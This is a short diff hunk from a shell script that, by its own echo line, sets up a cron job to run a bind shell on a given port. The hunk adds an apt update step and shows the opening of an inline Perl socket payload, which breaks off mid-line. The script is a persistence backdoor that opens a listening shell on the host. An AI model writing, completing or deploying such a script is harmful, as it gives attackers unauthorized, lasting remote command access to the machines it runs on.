@@ -20,6 +20,7 @@ fi
 echo "Creating cron job to run a BIND shell on port $PORT"
 
 echo "Install requirements..."
+sudo apt update
 sudo apt install cron -y
 
 SCRIPT="use Socket;\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\
